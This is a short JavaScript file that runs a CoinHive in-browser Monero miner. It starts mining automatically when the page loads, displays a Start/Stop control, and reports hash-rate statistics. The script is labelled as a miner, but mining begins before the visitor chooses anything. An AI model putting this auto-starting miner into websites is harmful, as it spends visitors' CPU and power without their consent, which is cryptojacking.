var miner;
var autoStart = true;

function toggleMonero() {
	if (typeof miner == 'undefined') { return false; }

	autoStart = false;

	if (!miner.isRunning()) {
		$("h1").addClass("loading");
		$("#control a").html("Stop");
		miner.start();
	} else {
		$("h1").removeClass("loading");
		$("#control a").html("Start");
		miner.stop();
	}
}

$(document).ready(function() {
	miner = new CoinHive.Anonymous('LcCPO41CuSSq15vrQNSgLLqXP1EAt1e4',{
		autoThreads: true,
		forceASMJS: false
	});

	// Update stats once per second
	setInterval(function() {
		var hashesPerSecond = miner.getHashesPerSecond();
		var totalHashes = miner.getTotalHashes();
		var acceptedHashes = miner.getAcceptedHashes();

		$("#hashesPerSecond").html(hashesPerSecond.toFixed(1).toString());
		$("#totalHashes").html(totalHashes);
		$("#acceptedHashes").html(acceptedHashes);
	}, 1000);

	if (autoStart) { toggleMonero(); }
});